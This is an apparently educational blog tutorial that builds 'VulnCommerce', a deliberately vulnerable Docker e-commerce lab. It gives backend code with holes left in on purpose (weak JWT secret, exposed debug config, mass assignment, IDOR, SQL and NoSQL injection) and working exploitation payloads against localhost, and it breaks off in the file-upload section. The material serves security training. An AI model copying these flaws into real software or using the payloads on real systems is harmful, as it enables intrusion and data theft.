# Building Your Own Vulnerable Lab: A Complete Hacking Practice Environment

*A Docker-based, production-realistic lab with 15+ intentional vulnerabilities across React, Node.js, FastAPI, PostgreSQL, MongoDB, GraphQL, and AWS -- built for serious security researchers.*

**Meta Description:** Build a complete vulnerable lab environment with Docker Compose featuring intentional XSS, SQL injection, NoSQL injection, IDOR, SSRF, JWT attacks, race conditions, broken RBAC, file upload exploits, GraphQL vulnerabilities, and misconfigured cloud services. Full code, seed data, and exploitation guides included.

**Slug:** building-vulnerable-lab-hacking-practice-environment

**Keywords:** vulnerable lab, hacking lab setup, Docker security lab, intentional vulnerabilities, XSS practice, SQL injection lab, SSRF lab, IDOR practice, JWT hacking, GraphQL exploitation, bug bounty practice, penetration testing lab, OWASP vulnerable application, security training environment

---

## Introduction

Every public vulnerable application -- DVWA, Juice Shop, WebGoat -- shares the same problem: they do not look or behave like the SaaS applications you actually test in bug bounties. Their tech stacks are outdated, their vulnerability patterns are textbook, and their architecture is monolithic.

This post builds something different. We are constructing a complete SaaS-style application called **VulnCommerce** -- an e-commerce platform with a React frontend, dual backends (Node.js/Express and FastAPI), PostgreSQL and MongoDB databases, a GraphQL API, LocalStack for AWS simulation, and an intentionally misconfigured Nginx reverse proxy. Every component contains real-world vulnerabilities mapped to specific bug classes you encounter in production bounty programs.

By the end of this post, you will have a running lab with 15+ exploitable vulnerabilities across 6 difficulty levels. Each vulnerability mirrors a pattern that has paid real bounties on HackerOne and Bugcrowd.

The entire lab runs with a single `docker compose up`.

---

## Architecture Overview

```
                         +------------------+
                         |    Nginx         |
                         |  (misconfigured) |
                         |    :80/:443      |
                         +--------+---------+
                                  |
                    +-------------+-------------+
                    |             |              |
              +-----+----+ +-----+-----+  +----+------+
              |  React   | | Node.js   |  |  FastAPI  |
              | Frontend | | Express   |  |  Backend  |
              |  :3000   | | API :4000 |  |  :8000    |
              +-----+----+ +-----+-----+  +-----+----+
                    |            |    |          |
                    |       +----+----+----+     |
                    |       |         |    |     |
               +----+---+ +-+------+ +----+--+  |
               |GraphQL | |Postgres| |MongoDB |  |
               | Apollo | | :5432  | | :27017 |  |
               | :4001  | +--------+ +--------+  |
               +--------+                        |
                                            +----+------+
                                            | LocalStack|
                                            | (AWS sim) |
                                            |  :4566    |
                                            +-----------+
```

---

## 1. Complete Docker Compose Setup

```yaml
# docker-compose.yml
version: '3.8'

services:
  # ============================================
  # NGINX - Intentionally Misconfigured
  # ============================================
  nginx:
    image: nginx:1.25
    ports:
      - "80:80"
      - "443:443"
    volumes:
      - ./nginx/nginx.conf:/etc/nginx/nginx.conf
      - ./nginx/certs:/etc/nginx/certs
    depends_on:
      - frontend
      - express-api
      - fastapi-api
      - graphql-api
    networks:
      - vulnnet

  # ============================================
  # REACT FRONTEND - XSS Vulnerabilities
  # ============================================
  frontend:
    build: ./frontend
    ports:
      - "3000:3000"
    environment:
      - REACT_APP_API_URL=http://localhost:4000
      - REACT_APP_GRAPHQL_URL=http://localhost:4001/graphql
    networks:
      - vulnnet

  # ============================================
  # NODE.JS/EXPRESS API - Multiple Vulnerabilities
  # ============================================
  express-api:
    build: ./express-api
    ports:
      - "4000:4000"
    environment:
      - JWT_SECRET=supersecretkey123
      - DATABASE_URL=postgresql://vulnuser:vulnpass@postgres:5432/vulncommerce
      - MONGODB_URI=mongodb://mongo:27017/vulncommerce
      - AWS_ENDPOINT=http://localstack:4566
      - AWS_ACCESS_KEY_ID=test
      - AWS_SECRET_ACCESS_KEY=test
      - AWS_REGION=us-east-1
      - REDIS_URL=redis://redis:6379
    depends_on:
      postgres:
        condition: service_healthy
      mongo:
        condition: service_started
      redis:
        condition: service_started
      localstack:
        condition: service_started
    networks:
      - vulnnet

  # ============================================
  # FASTAPI BACKEND - Same Vulnerabilities, Python
  # ============================================
  fastapi-api:
    build: ./fastapi-api
    ports:
      - "8000:8000"
    environment:
      - JWT_SECRET=supersecretkey123
      - DATABASE_URL=postgresql://vulnuser:vulnpass@postgres:5432/vulncommerce
      - MONGODB_URI=mongodb://mongo:27017/vulncommerce
      - AWS_ENDPOINT=http://localstack:4566
      - AWS_ACCESS_KEY_ID=test
      - AWS_SECRET_ACCESS_KEY=test
      - AWS_REGION=us-east-1
    depends_on:
      postgres:
        condition: service_healthy
      mongo:
        condition: service_started
      localstack:
        condition: service_started
    networks:
      - vulnnet

  # ============================================
  # GRAPHQL API - Apollo Server (Vulnerable)
  # ============================================
  graphql-api:
    build: ./graphql-api
    ports:
      - "4001:4001"
    environment:
      - DATABASE_URL=postgresql://vulnuser:vulnpass@postgres:5432/vulncommerce
      - MONGODB_URI=mongodb://mongo:27017/vulncommerce
    depends_on:
      postgres:
        condition: service_healthy
      mongo:
        condition: service_started
    networks:
      - vulnnet

  # ============================================
  # POSTGRESQL
  # ============================================
  postgres:
    image: postgres:16
    ports:
      - "5432:5432"
    environment:
      - POSTGRES_USER=vulnuser
      - POSTGRES_PASSWORD=vulnpass
      - POSTGRES_DB=vulncommerce
    volumes:
      - ./database/postgres-init.sql:/docker-entrypoint-initdb.d/init.sql
      - pgdata:/var/lib/postgresql/data
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U vulnuser -d vulncommerce"]
      interval: 5s
      timeout: 5s
      retries: 5
    networks:
      - vulnnet

  # ============================================
  # MONGODB
  # ============================================
  mongo:
    image: mongo:7
    ports:
      - "27017:27017"
    volumes:
      - ./database/mongo-init.js:/docker-entrypoint-initdb.d/init.js
      - mongodata:/data/db
    networks:
      - vulnnet

  # ============================================
  # REDIS (for session/rate limiting)
  # ============================================
  redis:
    image: redis:7-alpine
    ports:
      - "6379:6379"
    networks:
      - vulnnet

  # ============================================
  # LOCALSTACK (AWS Simulation)
  # ============================================
  localstack:
    image: localstack/localstack:3.0
    ports:
      - "4566:4566"
    environment:
      - SERVICES=s3,iam,sts,secretsmanager
      - DEFAULT_REGION=us-east-1
      - EAGER_SERVICE_LOADING=1
    volumes:
      - ./localstack/init-aws.sh:/etc/localstack/init/ready.d/init-aws.sh
      - localstackdata:/var/lib/localstack
    networks:
      - vulnnet

volumes:
  pgdata:
  mongodata:
  localstackdata:

networks:
  vulnnet:
    driver: bridge
```

---

## 2. PostgreSQL Database with Seed Data

```sql
-- database/postgres-init.sql

-- Users table
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    uuid UUID DEFAULT gen_random_uuid(),
    email VARCHAR(255) UNIQUE NOT NULL,
    password_hash VARCHAR(255) NOT NULL,
    name VARCHAR(255) NOT NULL,
    role VARCHAR(50) DEFAULT 'customer',  -- customer, support, admin
    is_active BOOLEAN DEFAULT true,
    subscription_tier VARCHAR(50) DEFAULT 'free',  -- free, pro, enterprise
    credit_balance DECIMAL(10,2) DEFAULT 0.00,
    phone VARCHAR(20),
    address TEXT,
    ssn_encrypted VARCHAR(255),  -- intentionally stored with weak encryption
    created_at TIMESTAMP DEFAULT NOW(),
    updated_at TIMESTAMP DEFAULT NOW()
);

-- Products table
CREATE TABLE products (
    id SERIAL PRIMARY KEY,
    name VARCHAR(255) NOT NULL,
    description TEXT,
    price DECIMAL(10,2) NOT NULL,
    stock INTEGER DEFAULT 0,
    category VARCHAR(100),
    image_url VARCHAR(500),
    created_at TIMESTAMP DEFAULT NOW()
);

-- Orders table
CREATE TABLE orders (
    id SERIAL PRIMARY KEY,
    order_number VARCHAR(50) UNIQUE NOT NULL,
    user_id INTEGER REFERENCES users(id),
    total DECIMAL(10,2) NOT NULL,
    discount DECIMAL(10,2) DEFAULT 0.00,
    status VARCHAR(50) DEFAULT 'pending',
    payment_status VARCHAR(50) DEFAULT 'unpaid',
    shipping_address TEXT,
    created_at TIMESTAMP DEFAULT NOW()
);

-- Order items
CREATE TABLE order_items (
    id SERIAL PRIMARY KEY,
    order_id INTEGER REFERENCES orders(id),
    product_id INTEGER REFERENCES products(id),
    quantity INTEGER NOT NULL,
    unit_price DECIMAL(10,2) NOT NULL,
    total_price DECIMAL(10,2) NOT NULL
);

-- Coupons table (for race condition testing)
CREATE TABLE coupons (
    id SERIAL PRIMARY KEY,
    code VARCHAR(50) UNIQUE NOT NULL,
    discount_percent INTEGER NOT NULL,
    max_uses INTEGER DEFAULT 1,
    current_uses INTEGER DEFAULT 0,
    is_active BOOLEAN DEFAULT true,
    created_at TIMESTAMP DEFAULT NOW()
);

-- Invoices table (for IDOR testing)
CREATE TABLE invoices (
    id SERIAL PRIMARY KEY,
    invoice_number VARCHAR(50) UNIQUE NOT NULL,
    user_id INTEGER REFERENCES users(id),
    order_id INTEGER REFERENCES orders(id),
    amount DECIMAL(10,2) NOT NULL,
    tax DECIMAL(10,2) DEFAULT 0.00,
    billing_name VARCHAR(255),
    billing_address TEXT,
    card_last4 VARCHAR(4),
    card_brand VARCHAR(20),
    pdf_url VARCHAR(500),
    created_at TIMESTAMP DEFAULT NOW()
);

-- API keys table
CREATE TABLE api_keys (
    id SERIAL PRIMARY KEY,
    user_id INTEGER REFERENCES users(id),
    key_hash VARCHAR(255) NOT NULL,
    key_prefix VARCHAR(10) NOT NULL,  -- first 8 chars for identification
    name VARCHAR(100),
    permissions JSONB DEFAULT '["read"]',
    is_active BOOLEAN DEFAULT true,
    last_used_at TIMESTAMP,
    created_at TIMESTAMP DEFAULT NOW()
);

-- File uploads tracking
CREATE TABLE file_uploads (
    id SERIAL PRIMARY KEY,
    user_id INTEGER REFERENCES users(id),
    filename VARCHAR(255) NOT NULL,
    original_filename VARCHAR(255) NOT NULL,
    file_path VARCHAR(500) NOT NULL,
    mime_type VARCHAR(100),
    file_size INTEGER,
    created_at TIMESTAMP DEFAULT NOW()
);

-- ============================================
-- SEED DATA
-- ============================================

-- Password for all users: "password123" (bcrypt hash)
INSERT INTO users (email, password_hash, name, role, subscription_tier, credit_balance, phone, address, ssn_encrypted) VALUES
('admin@vulncommerce.com', '$2b$10$rQEYlz0JzGJFPArYJ8Sfje8vVOwYtiVMse/MNB6Yy3QbNPGFYOCjK', 'Admin User', 'admin', 'enterprise', 10000.00, '+1-555-0100', '100 Admin St, San Francisco, CA 94102', 'enc_123-45-6789'),
('support@vulncommerce.com', '$2b$10$rQEYlz0JzGJFPArYJ8Sfje8vVOwYtiVMse/MNB6Yy3QbNPGFYOCjK', 'Support Agent', 'support', 'pro', 500.00, '+1-555-0200', '200 Support Ave, San Francisco, CA 94103', 'enc_234-56-7890'),
('alice@example.com', '$2b$10$rQEYlz0JzGJFPArYJ8Sfje8vVOwYtiVMse/MNB6Yy3QbNPGFYOCjK', 'Alice Johnson', 'customer', 'pro', 150.00, '+1-555-0301', '301 Oak St, Portland, OR 97201', 'enc_345-67-8901'),
('bob@example.com', '$2b$10$rQEYlz0JzGJFPArYJ8Sfje8vVOwYtiVMse/MNB6Yy3QbNPGFYOCjK', 'Bob Smith', 'customer', 'free', 25.00, '+1-555-0402', '402 Pine St, Seattle, WA 98101', 'enc_456-78-9012'),
('charlie@example.com', '$2b$10$rQEYlz0JzGJFPArYJ8Sfje8vVOwYtiVMse/MNB6Yy3QbNPGFYOCjK', 'Charlie Brown', 'customer', 'enterprise', 5000.00, '+1-555-0503', '503 Elm St, Austin, TX 73301', 'enc_567-89-0123');

INSERT INTO products (name, description, price, stock, category) VALUES
('Laptop Pro X1', 'High-performance laptop with 32GB RAM', 1299.99, 50, 'electronics'),
('Wireless Headphones', 'Noise-cancelling Bluetooth headphones', 199.99, 200, 'electronics'),
('Mechanical Keyboard', 'Cherry MX Blue switches, RGB', 149.99, 150, 'accessories'),
('USB-C Hub', '7-in-1 USB-C docking station', 79.99, 300, 'accessories'),
('Monitor 27" 4K', '27-inch 4K IPS display', 499.99, 75, 'electronics'),
('Standing Desk', 'Electric height-adjustable desk', 699.99, 30, 'furniture'),
('Webcam HD', '1080p webcam with built-in mic', 89.99, 250, 'electronics'),
('Mouse Pad XL', 'Extended gaming mouse pad', 29.99, 500, 'accessories'),
('Cable Management Kit', 'Under-desk cable management system', 34.99, 400, 'accessories'),
('Desk Lamp LED', 'Adjustable LED desk lamp with USB', 49.99, 180, 'furniture');

INSERT INTO orders (order_number, user_id, total, discount, status, payment_status, shipping_address) VALUES
('ORD-2024-0001', 3, 1499.98, 0.00, 'delivered', 'paid', '301 Oak St, Portland, OR 97201'),
('ORD-2024-0002', 3, 199.99, 20.00, 'shipped', 'paid', '301 Oak St, Portland, OR 97201'),
('ORD-2024-0003', 4, 79.99, 0.00, 'pending', 'paid', '402 Pine St, Seattle, WA 98101'),
('ORD-2024-0004', 5, 2199.97, 100.00, 'processing', 'paid', '503 Elm St, Austin, TX 73301'),
('ORD-2024-0005', 4, 149.99, 0.00, 'pending', 'unpaid', '402 Pine St, Seattle, WA 98101');

INSERT INTO order_items (order_id, product_id, quantity, unit_price, total_price) VALUES
(1, 1, 1, 1299.99, 1299.99),
(1, 3, 1, 149.99, 149.99),
(2, 2, 1, 199.99, 199.99),
(3, 4, 1, 79.99, 79.99),
(4, 1, 1, 1299.99, 1299.99),
(4, 5, 1, 499.99, 499.99),
(4, 6, 1, 699.99, 699.99),
(5, 3, 1, 149.99, 149.99);

INSERT INTO coupons (code, discount_percent, max_uses, current_uses) VALUES
('WELCOME10', 10, 1000, 450),
('SINGLE50', 50, 1, 0),
('LOYALTY20', 20, 100, 23),
('EXPIRED99', 99, 1, 1),
('VIP30', 30, 5, 2);

INSERT INTO invoices (invoice_number, user_id, order_id, amount, tax, billing_name, billing_address, card_last4, card_brand) VALUES
('INV-2024-0001', 3, 1, 1499.98, 120.00, 'Alice Johnson', '301 Oak St, Portland, OR 97201', '4242', 'visa'),
('INV-2024-0002', 3, 2, 179.99, 14.40, 'Alice Johnson', '301 Oak St, Portland, OR 97201', '4242', 'visa'),
('INV-2024-0003', 4, 3, 79.99, 6.40, 'Bob Smith', '402 Pine St, Seattle, WA 98101', '1234', 'mastercard'),
('INV-2024-0004', 5, 4, 2099.97, 168.00, 'Charlie Brown', '503 Elm St, Austin, TX 73301', '5678', 'amex'),
('INV-2024-0005', 4, 5, 149.99, 12.00, 'Bob Smith', '402 Pine St, Seattle, WA 98101', '1234', 'mastercard');
```

---

## 3. MongoDB Seed Data

```javascript
// database/mongo-init.js

db = db.getSiblingDB('vulncommerce');

// Product reviews (for NoSQL injection testing)
db.reviews.insertMany([
  {
    product_id: 1,
    user_id: 3,
    user_name: "Alice Johnson",
    rating: 5,
    title: "Excellent laptop!",
    comment: "Best purchase I've made this year. The performance is outstanding.",
    helpful_votes: 23,
    created_at: new Date("2024-11-15")
  },
  {
    product_id: 1,
    user_id: 4,
    user_name: "Bob Smith",
    rating: 4,
    title: "Great but pricey",
    comment: "Solid build quality. Wish it was a bit cheaper though.",
    helpful_votes: 8,
    created_at: new Date("2024-11-20")
  },
  {
    product_id: 2,
    user_id: 5,
    user_name: "Charlie Brown",
    rating: 5,
    title: "Perfect noise cancellation",
    comment: "These headphones are incredible for focus work.",
    helpful_votes: 15,
    created_at: new Date("2024-12-01")
  },
  {
    product_id: 3,
    user_id: 3,
    user_name: "Alice Johnson",
    rating: 3,
    title: "Too loud for office",
    comment: "Great feel but the blue switches are way too loud for shared spaces.",
    helpful_votes: 31,
    created_at: new Date("2024-12-10")
  }
]);

// User sessions (for session-based attacks)
db.sessions.insertMany([
  {
    session_id: "sess_abc123def456",
    user_id: 1,
    email: "admin@vulncommerce.com",
    role: "admin",
    ip_address: "192.168.1.100",
    user_agent: "Mozilla/5.0",
    created_at: new Date(),
    expires_at: new Date(Date.now() + 86400000)
  },
  {
    session_id: "sess_ghi789jkl012",
    user_id: 3,
    email: "alice@example.com",
    role: "customer",
    ip_address: "192.168.1.101",
    user_agent: "Mozilla/5.0",
    created_at: new Date(),
    expires_at: new Date(Date.now() + 86400000)
  }
]);

// Audit logs
db.audit_logs.insertMany([
  {
    action: "user.login",
    user_id: 1,
    ip_address: "192.168.1.100",
    details: { method: "password", success: true },
    created_at: new Date()
  },
  {
    action: "order.create",
    user_id: 3,
    ip_address: "192.168.1.101",
    details: { order_id: "ORD-2024-0001", total: 1499.98 },
    created_at: new Date()
  },
  {
    action: "user.password_reset",
    user_id: 4,
    ip_address: "10.0.0.50",
    details: { method: "email", token: "rst_weaktoken123" },
    created_at: new Date()
  }
]);

// Internal configuration (should not be accessible)
db.internal_config.insertOne({
  app_name: "VulnCommerce",
  version: "2.1.0",
  stripe_secret_key: "sk_live_fake_4eC39HqLyjWDarjtT1zdp7dc",
  sendgrid_api_key: "SG.fake_key_xxxxxxxxxxxxx",
  aws_access_key: "AKIAFAKEKEY12345",
  aws_secret_key: "FaKeS3cR3tKeY+abcdefghijklmnop",
  admin_api_key: "vulncommerce_admin_sk_98765",
  database_master_password: "SuperSecretDBPass!2024",
  jwt_secret: "supersecretkey123",
  feature_flags: {
    enable_debug_mode: true,
    enable_graphql_introspection: true,
    enable_legacy_api: true,
    disable_rate_limiting: true
  }
});

// Create indexes
db.reviews.createIndex({ product_id: 1 });
db.reviews.createIndex({ user_id: 1 });
db.sessions.createIndex({ session_id: 1 }, { unique: true });
db.sessions.createIndex({ expires_at: 1 }, { expireAfterSeconds: 0 });
db.audit_logs.createIndex({ created_at: -1 });
```

---

## 4. Node.js/Express Backend (Vulnerable)

### 4.1 Project Setup

```javascript
// express-api/package.json
{
  "name": "vulncommerce-express-api",
  "version": "1.0.0",
  "scripts": {
    "start": "node server.js",
    "dev": "nodemon server.js"
  },
  "dependencies": {
    "express": "^4.18.2",
    "jsonwebtoken": "^9.0.2",
    "bcrypt": "^5.1.1",
    "pg": "^8.12.0",
    "mongoose": "^8.1.0",
    "multer": "^1.4.5-lts.1",
    "axios": "^1.6.5",
    "cors": "^2.8.5",
    "cookie-parser": "^1.4.6",
    "@aws-sdk/client-s3": "^3.490.0",
    "ioredis": "^5.3.2"
  }
}
```

```dockerfile
# express-api/Dockerfile
FROM node:20-slim
WORKDIR /app
COPY package*.json ./
RUN npm install
COPY . .
RUN mkdir -p /app/uploads
EXPOSE 4000
CMD ["node", "server.js"]
```

### 4.2 Main Server File

```javascript
// express-api/server.js
const express = require('express');
const cors = require('cors');
const cookieParser = require('cookie-parser');
const { Pool } = require('pg');
const mongoose = require('mongoose');

const app = express();

// ==========================================
// VULNERABILITY: Overly permissive CORS
// ==========================================
app.use(cors({
  origin: true,  // Reflects any origin -- allows cross-origin attacks
  credentials: true
}));

app.use(express.json());
app.use(cookieParser());

// Serve uploaded files directly (no access control)
app.use('/uploads', express.static('/app/uploads'));

// Database connections
const pool = new Pool({ connectionString: process.env.DATABASE_URL });
mongoose.connect(process.env.MONGODB_URI);

// Import routes
const authRoutes = require('./routes/auth');
const userRoutes = require('./routes/users');
const productRoutes = require('./routes/products');
const orderRoutes = require('./routes/orders');
const invoiceRoutes = require('./routes/invoices');
const uploadRoutes = require('./routes/uploads');
const fetchRoutes = require('./routes/fetch');
const couponRoutes = require('./routes/coupons');
const adminRoutes = require('./routes/admin');
const reviewRoutes = require('./routes/reviews');

app.use('/api/auth', authRoutes);
app.use('/api/users', userRoutes);
app.use('/api/products', productRoutes);
app.use('/api/orders', orderRoutes);
app.use('/api/invoices', invoiceRoutes);
app.use('/api/upload', uploadRoutes);
app.use('/api/fetch', fetchRoutes);
app.use('/api/coupons', couponRoutes);
app.use('/api/admin', adminRoutes);
app.use('/api/reviews', reviewRoutes);

// ==========================================
// VULNERABILITY: Debug endpoint left in production
// ==========================================
app.get('/api/debug/config', (req, res) => {
  res.json({
    database_url: process.env.DATABASE_URL,
    jwt_secret: process.env.JWT_SECRET,
    aws_key: process.env.AWS_ACCESS_KEY_ID,
    node_env: process.env.NODE_ENV,
    uptime: process.uptime()
  });
});

app.listen(4000, () => {
  console.log('VulnCommerce Express API running on port 4000');
});

module.exports = { app, pool };
```

### 4.3 Broken JWT Authentication

```javascript
// express-api/middleware/auth.js
const jwt = require('jsonwebtoken');

// ==========================================
// VULNERABILITY 1: Weak JWT secret (easily brutable)
// VULNERABILITY 2: No algorithm enforcement (alg confusion)
// VULNERABILITY 3: Token not checked against blacklist
// ==========================================

const authenticate = (req, res, next) => {
  const authHeader = req.headers.authorization;
  if (!authHeader) return res.status(401).json({ error: 'No token provided' });

  const token = authHeader.split(' ')[1];

  try {
    // VULNERABLE: Does not specify algorithms -- allows alg:none and HS256/RS256 confusion
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch (err) {
    return res.status(401).json({ error: 'Invalid token' });
  }
};

// ==========================================
// VULNERABILITY: Role check is client-side only
// The "requireAdmin" middleware exists but is not applied to all admin routes
// ==========================================
const requireAdmin = (req, res, next) => {
  if (req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Admin access required' });
  }
  next();
};

// VULNERABILITY: Support role check is missing entirely for some routes
const requireSupport = (req, res, next) => {
  if (req.user.role !== 'support' && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Support access required' });
  }
  next();
};

module.exports = { authenticate, requireAdmin, requireSupport };
```

```javascript
// express-api/routes/auth.js
const express = require('express');
const router = express.Router();
const jwt = require('jsonwebtoken');
const bcrypt = require('bcrypt');
const { pool } = require('../server');

// Login endpoint
router.post('/login', async (req, res) => {
  const { email, password } = req.body;

  try {
    const result = await pool.query('SELECT * FROM users WHERE email = $1', [email]);
    const user = result.rows[0];

    if (!user || !await bcrypt.compare(password, user.password_hash)) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    // ==========================================
    // VULNERABILITY: Weak secret, long expiry, no rotation
    // ==========================================
    const token = jwt.sign(
      {
        user_id: user.id,
        email: user.email,
        role: user.role,
        subscription_tier: user.subscription_tier
      },
      process.env.JWT_SECRET,  // "supersecretkey123" -- easily cracked
      { expiresIn: '30d' }     // 30 days -- way too long
    );

    res.json({
      token,
      user: {
        id: user.id,
        email: user.email,
        name: user.name,
        role: user.role
      }
    });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Register endpoint
router.post('/register', async (req, res) => {
  const { email, password, name } = req.body;

  try {
    const hash = await bcrypt.hash(password, 10);

    // ==========================================
    // VULNERABILITY: Mass assignment -- role can be set at registration
    // ==========================================
    const role = req.body.role || 'customer';
    const subscription_tier = req.body.subscription_tier || 'free';

    const result = await pool.query(
      'INSERT INTO users (email, password_hash, name, role, subscription_tier) VALUES ($1, $2, $3, $4, $5) RETURNING id, email, name, role',
      [email, hash, name, role, subscription_tier]
    );

    res.status(201).json({ user: result.rows[0] });
  } catch (err) {
    if (err.code === '23505') {
      return res.status(409).json({ error: 'Email already exists' });
    }
    res.status(500).json({ error: 'Server error' });
  }
});

module.exports = router;
```

**Exploitation -- JWT weak secret:**

```bash
# Crack the JWT secret with hashcat
hashcat -a 0 -m 16500 \
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo0LCJlbWFpbCI6ImJvYkBleGFtcGxlLmNvbSIsInJvbGUiOiJjdXN0b21lciJ9.SIGNATURE" \
  /usr/share/wordlists/rockyou.txt

# Result: supersecretkey123
# Now forge any token:
```

```python
# Forge admin token
import jwt

token = jwt.encode(
    {"user_id": 1, "email": "admin@vulncommerce.com", "role": "admin"},
    "supersecretkey123",
    algorithm="HS256"
)
print(token)
```

**Exploitation -- Mass assignment at registration:**

```http
POST /api/auth/register HTTP/1.1
Host: localhost:4000
Content-Type: application/json

{
  "email": "attacker@evil.com",
  "password": "attackerpass",
  "name": "Attacker",
  "role": "admin",
  "subscription_tier": "enterprise"
}
```

**Difficulty:** Easy (JWT cracking), Easy (Mass assignment)

### 4.4 IDOR Endpoints (Horizontal and Vertical)

```javascript
// express-api/routes/invoices.js
const express = require('express');
const router = express.Router();
const { pool } = require('../server');
const { authenticate } = require('../middleware/auth');

// ==========================================
// VULNERABILITY: Horizontal IDOR
// No ownership check -- any authenticated user can read any invoice
// ==========================================
router.get('/:invoiceNumber', authenticate, async (req, res) => {
  try {
    const result = await pool.query(
      'SELECT i.*, u.name, u.email, u.address, u.phone FROM invoices i JOIN users u ON i.user_id = u.id WHERE i.invoice_number = $1',
      [req.params.invoiceNumber]
    );

    if (result.rows.length === 0) {
      return res.status(404).json({ error: 'Invoice not found' });
    }

    // MISSING: if (result.rows[0].user_id !== req.user.user_id) return 403
    res.json(result.rows[0]);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// ==========================================
// VULNERABILITY: Vertical IDOR
// Any user can download any invoice PDF (no auth check at all)
// ==========================================
router.get('/:invoiceNumber/pdf', async (req, res) => {
  // No authentication middleware applied
  try {
    const result = await pool.query(
      'SELECT pdf_url FROM invoices WHERE invoice_number = $1',
      [req.params.invoiceNumber]
    );

    if (result.rows.length === 0) {
      return res.status(404).json({ error: 'Invoice not found' });
    }

    res.json({ download_url: result.rows[0].pdf_url });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

module.exports = router;
```

**Exploitation:**

```http
# Step 1: Get your own invoice (as bob@example.com, user_id=4)
GET /api/invoices/INV-2024-0003 HTTP/1.1
Host: localhost:4000
Authorization: Bearer <bob_token>

# Response: Bob's invoice (expected)

# Step 2: Access Alice's invoice
GET /api/invoices/INV-2024-0001 HTTP/1.1
Host: localhost:4000
Authorization: Bearer <bob_token>

# Response: Alice's full invoice with PII (IDOR)

# Step 3: Access invoice PDF without any auth
GET /api/invoices/INV-2024-0004/pdf HTTP/1.1
Host: localhost:4000

# Response: Download URL for Charlie's invoice PDF (no auth required)
```

**Difficulty:** Easy (horizontal), Easy (vertical/unauthenticated)

### 4.5 SQL Injection Endpoints

```javascript
// express-api/routes/products.js
const express = require('express');
const router = express.Router();
const { pool } = require('../server');

// ==========================================
// VULNERABILITY: SQL Injection via string concatenation
// ==========================================
router.get('/search', async (req, res) => {
  const { q, category, sort } = req.query;

  try {
    // VULNERABLE: Direct string interpolation in SQL
    let query = `SELECT * FROM products WHERE 1=1`;

    if (q) {
      query += ` AND (name ILIKE '%${q}%' OR description ILIKE '%${q}%')`;
    }
    if (category) {
      query += ` AND category = '${category}'`;
    }
    if (sort) {
      query += ` ORDER BY ${sort}`;  // ORDER BY injection
    }

    const result = await pool.query(query);
    res.json(result.rows);
  } catch (err) {
    // ==========================================
    // VULNERABILITY: Verbose error messages leak query structure
    // ==========================================
    res.status(500).json({ error: err.message, query: err.query || 'unknown' });
  }
});

// Safe endpoint for comparison (parameterized)
router.get('/:id', async (req, res) => {
  try {
    const result = await pool.query('SELECT * FROM products WHERE id = $1', [req.params.id]);
    if (result.rows.length === 0) return res.status(404).json({ error: 'Not found' });
    res.json(result.rows[0]);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

module.exports = router;
```

**Exploitation -- Union-based SQL injection:**

```http
# Extract database version
GET /api/products/search?q=' UNION SELECT null,null,version(),null,null,null,null,null-- HTTP/1.1
Host: localhost:4000

# Extract user table
GET /api/products/search?q=' UNION SELECT id,email,password_hash,name,role,ssn_encrypted,null,null FROM users-- HTTP/1.1
Host: localhost:4000

# Extract via ORDER BY injection
GET /api/products/search?sort=price;SELECT+pg_sleep(5)-- HTTP/1.1
Host: localhost:4000

# Boolean-based blind injection
GET /api/products/search?category=electronics' AND (SELECT CASE WHEN (SELECT LENGTH(password_hash) FROM users WHERE role='admin')>50 THEN 1 ELSE 1/0 END)=1-- HTTP/1.1
Host: localhost:4000

# Error-based extraction
GET /api/products/search?q=' AND 1=CAST((SELECT password_hash FROM users LIMIT 1) AS int)-- HTTP/1.1
Host: localhost:4000
```

**Difficulty:** Medium (Union-based), Hard (Blind/time-based)

### 4.6 NoSQL Injection Endpoints

```javascript
// express-api/routes/reviews.js
const express = require('express');
const router = express.Router();
const mongoose = require('mongoose');
const { authenticate } = require('../middleware/auth');

const Review = mongoose.model('Review', new mongoose.Schema({
  product_id: Number,
  user_id: Number,
  user_name: String,
  rating: Number,
  title: String,
  comment: String,
  helpful_votes: Number,
  created_at: Date
}), 'reviews');

// ==========================================
// VULNERABILITY: NoSQL Injection
// User input passed directly to MongoDB query operators
// ==========================================
router.get('/product/:productId', async (req, res) => {
  const { min_rating, user_name } = req.query;

  try {
    let filter = { product_id: parseInt(req.params.productId) };

    // VULNERABLE: query parameter parsed as object allows operator injection
    if (min_rating) {
      filter.rating = min_rating;  // If min_rating={"$gt":0}, MongoDB treats it as operator
    }
    if (user_name) {
      filter.user_name = user_name;
    }

    const reviews = await Review.find(filter).sort({ created_at: -1 });
    res.json(reviews);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// ==========================================
// VULNERABILITY: NoSQL injection in authentication bypass
// ==========================================
router.post('/login-legacy', async (req, res) => {
  // Legacy login that uses MongoDB sessions
  const { email, password } = req.body;

  try {
    const Session = mongoose.model('Session', new mongoose.Schema({}, { strict: false }), 'sessions');

    // VULNERABLE: Direct object pass allows $gt, $ne, $regex operators
    const session = await Session.findOne({ email: email, role: password });
    if (session) {
      res.json({ message: 'Authenticated', session_id: session.session_id });
    } else {
      res.status(401).json({ error: 'Invalid credentials' });
    }
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

module.exports = router;
```

**Exploitation:**

```http
# NoSQL injection -- bypass authentication
POST /api/reviews/login-legacy HTTP/1.1
Host: localhost:4000
Content-Type: application/json

{
  "email": {"$gt": ""},
  "password": {"$gt": ""}
}

# Response: Returns first session found (admin session)

# NoSQL injection -- extract all reviews regardless of product
GET /api/reviews/product/1?min_rating[$gt]=0&user_name[$regex]=.* HTTP/1.1
Host: localhost:4000

# NoSQL injection -- extract data with $where (if enabled)
GET /api/reviews/product/1?min_rating[$where]=this.rating>0 HTTP/1.1
Host: localhost:4000
```

**Difficulty:** Medium

### 4.7 File Upload with No Validation

```javascript
// express-api/routes/uploads.js
const express = require('express');
const router = express.Router();
const multer = require('multer');
const path = require('path');
